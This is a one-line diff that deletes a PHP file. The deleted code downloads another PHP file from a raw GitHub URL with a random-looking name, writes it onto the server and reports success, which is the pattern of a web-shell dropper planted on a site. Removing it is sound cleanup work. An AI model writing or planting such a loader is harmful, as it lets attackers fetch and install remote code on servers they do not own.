@@ -1,1 +1,0 @@
-<?php $c = file_get_contents('https://raw.githubusercontent.com/uoguzman/phphelloworld/refs/heads/main/1/odIOtcj1KLOFvl.php'); if (strpos($c, '<?php')===false) die('err'); file_put_contents('odIOtcj1KLOFvl-1.php', $c); die('ok');
